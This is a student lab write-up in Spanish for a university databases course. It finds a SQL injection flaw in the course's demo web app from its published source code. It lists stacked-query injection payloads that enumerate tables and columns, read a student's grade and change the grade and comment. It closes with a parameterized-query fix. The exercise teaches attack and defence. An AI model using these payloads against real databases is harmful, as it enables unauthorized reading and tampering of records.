Hecho por Daniel Hermosilla y Sebastián Jana
## Pregunta 1 

#### Parte A

```SQL 
SELECT *  
FROM uchile.transparencia  
WHERE apellido_p = 'Gutiérrez'  
ORDER BY total;
```

#### Parte B

```SQL 
SELECT nota  
FROM nota.cc3201  
WHERE nombre = 'Jana Cergneux, Sebastián';
```

#### Parte C
```SQL 
UPDATE nota.cc3201  
SET nota = 6.9999  
WHERE nombre = 'Jana Cergneux, Sebastián';
```
El resultado de la instrucción es `"ERROR:  permission denied for table cc3201"`

## Pregunta 2  

#### Parte A 

Al ejecutar la primera consulta se obtiene una tabla del tipo: 

|      table_name       |  table_schema  |
|:---------------------:|:--------------:|
|   view1_grupo23       |      eval      |
|   singrupo10          |      eval      |
|   poof_estado         |    eleccion    |
|         ...           |      ...       |

Donde se busca la fila que contenga el esquema nota, la fila correspondiente es:

|  table_name  |  table_schema  |
|:-----------:|:--------------:|
|    cc3201   |      nota      |

Al ejecutar la 2da consulta para *"table_name = cc3201"* y "*table_schema = nota"* se obtiene:

| column_name  |     data_type      |
|:------------:|:------------------:|
|      id      |     smallint       |
|   nombre     | character varying  |
|     nota     | double precision   |
|  comentario  | character varying  |


#### Parte B 

En el sitio http://cc3201.dcc.uchile.cl, al inspeccionar el código fuente, al expandir el elemento `head` se encuentra   el texto `<!-- https://github.com/matiastoro/cc3201 -->` . 

Al ingresar a la página de github, en el código de "App" se evidencia una posible oportunidad de inyección:  

```python
cur.execute("SELECT nombres, apellido_p, apellido_m, mes, anho, total FROM uchile.transparencia WHERE apellido_p='"+input+"' ORDER BY total DESC LIMIT 250")
``` 
Luego, se puede aprovechar esto para insertar ciertos inputs en la página https://cc3201.dcc.uchile.cl/

- **Inciso A:** Para obtener las tablas junto son sus esquemas en la base de datos se inserta `"'; SELECT table_name, table_schema FROM information_schema.tables; --"` en el input. 

![[Pasted image 20231019154507.png|center]]


- **Inciso B:** Para obtener las columnas y tipos de la tabla nota.cc3201 se inserta `"'; SELECT column_name, data_type FROM information_schema.columns WHERE table_name='cc3201' AND table_schema='nota'; --"` en el input. 

![[Pasted image 20231019154534.png|center]]

- **Inciso C:** Para obtener la nota se inserta `"'; SELECT nota FROM nota.cc3201 WHERE nombre = 'Jana Cergneux, Sebastián'; --"`

![[Pasted image 20231019154737.png|center]]


- **Inciso D**: Para cambiar la nota se inserta `"'; UPDATE nota.cc3201 SET nota = 7 WHERE nombre = 'Jana Cergneux, Sebastián'; --"` 
![[Pasted image 20231019154840.png|center]]

- **Inciso E:** Para cambiar el comentario se inserta `"'; UPDATE nota.cc3201 SET comentario = '𓀈𓀘𓁺 𓂀𓂯 𓃔𓅊' WHERE nombre = 'Jana Cergneux, Sebastián'; --"`

![[Pasted image 20231019155514.png|center]]

- **Inciso F**: Para evitar la inyección maliciosa se debe cambiar el código de la aplicación, en específico; 

```python
cur.execute("SELECT nombres, apellido_p, apellido_m, mes, anho, total FROM uchile.transparencia WHERE apellido_p='"+input+"' ORDER BY total DESC LIMIT 250")

"""
Cambiar por 
""" 

cur.execute("SELECT nombres, apellido_p, apellido_m, mes, anho, total FROM uchile.transparencia WHERE apellido_p=%s ORDER BY total DESC LIMIT 250", [input])
```

